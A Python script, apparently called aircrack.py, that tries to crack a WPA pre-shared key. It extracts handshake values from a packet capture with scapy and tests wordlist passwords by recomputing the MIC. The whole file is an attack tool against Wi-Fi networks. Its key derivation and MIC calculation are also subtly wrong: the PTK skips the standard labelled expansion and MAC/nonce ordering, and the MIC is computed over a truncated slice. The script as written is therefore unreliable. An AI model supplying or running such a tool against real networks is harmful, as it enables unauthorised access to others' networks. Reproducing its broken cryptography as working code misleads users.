import sys
import hmac
import hashlib
from scapy.all import rdpcap, EAPOL, Dot11Beacon
import binascii
import argparse

def extract_mic_and_nonce_and_ssid(input_file):
    packets = rdpcap(input_file)
    
    snonce = None
    mic = None
    sta_mac = None
    bssid = None
    anonce = None
    ssid = None

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_layer = packet.getlayer(EAPOL)
            # Check if it's a Key (Message 2 of 4)
            if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                mic = eapol_layer.key_mic
                print(f"Extracted MIC: {mic.hex()}")
                if not snonce:
                    snonce = eapol_layer.key_nonce
                    print(f"Extracted SNonce: {snonce.hex()}")

            # Check if it's a Key (Message 3 of 4) to extract ANonce
            if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                anonce = eapol_layer.key_nonce
                print(f"Extracted ANonce: {anonce.hex()}")

            # Extract STA MAC and BSSID
            if not sta_mac or not bssid:
                sta_mac = packet.addr2
                bssid = packet.addr1
                print(f"Extracted STA MAC: {sta_mac}")
                print(f"Extracted BSSID: {bssid}")

            # Break the loop if all values are found
            if mic and snonce and sta_mac and bssid and anonce:
                break

        # Extract SSID from Beacon packets
        if packet.haslayer(Dot11Beacon) and not ssid:
            ssid = packet.info.decode()
            print(f"Extracted SSID: {ssid}")

    if not snonce:
        print("No SNonce found in Message 2 of 4.")
    if not mic:
        print("No MIC found.")
    if not sta_mac:
        print("No STA MAC found.")
    if not bssid:
        print("No BSSID found.")
    if not anonce:
        print("No ANonce found in Message 3 of 4.")
    if not ssid:
        print("No SSID found.")

    return mic, snonce, sta_mac, bssid, anonce, ssid

def crack_psk(mic, snonce, sta_mac, bssid, anonce, ssid, wordlist):
    ssid = ssid.encode()
    sta_mac = binascii.unhexlify(sta_mac.replace(':', ''))
    bssid = binascii.unhexlify(bssid.replace(':', ''))
    mic = binascii.unhexlify(mic.hex())

    # Generate PMK (Pre-Shared Key)
    for word in wordlist:
        word = word.strip()
        print(f"Trying PSK: {word}")
        psk = word.encode()
        pmk = hashlib.pbkdf2_hmac('sha1', psk, ssid, 4096, 32)
        print(f"PMK: {pmk.hex()}")

        # Key Derivation: Generate PTK from PMK, ANonce, SNonce, and MAC addresses
        ptk = hmac.new(pmk, 
                       b'\x01\x00' + bssid + sta_mac + anonce + snonce + 
                       b'\x00' * 16, hashlib.sha1).digest()[:16]
        print(f"PTK: {ptk.hex()}")

        # MIC Calculation: Calculate the MIC using the PTK and the second part of the MIC from the capture
        mic_calc = hmac.new(ptk, b'\x01\x03\x00\x75\x00\x00\x00\x00' + mic[18:], hashlib.sha1).digest()[:16]
        print(f"Calculated MIC: {mic_calc.hex()}")

        # Check if the calculated MIC matches the extracted MIC
        if mic_calc == mic:
            print(f"Correct PSK found: {word}")
            return word

    print("No valid PSK found in wordlist.")
    return None

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Crack WPA PSK using aircrack.py')
    parser.add_argument('capture_file', help='Capture file (CAP/PCAP)')
    parser.add_argument('-P', '--wordlist', required=True, help='Wordlist file')
    
    args = parser.parse_args()
    capture_file = args.capture_file
    wordlist_file = args.wordlist

    # Extract MIC, nonces, MAC addresses, and SSID from the capture
    mic, snonce, sta_mac, bssid, anonce, ssid = extract_mic_and_nonce_and_ssid(capture_file)
    
    if mic and snonce and sta_mac and bssid and anonce and ssid:
        # Read the wordlist and attempt to crack the PSK
        with open(wordlist_file, 'r') as f:
            wordlist = f.readlines()
        crack_psk(mic, snonce, sta_mac, bssid, anonce, ssid, wordlist)
    else:
        print("Failed to extract necessary values from capture file.")
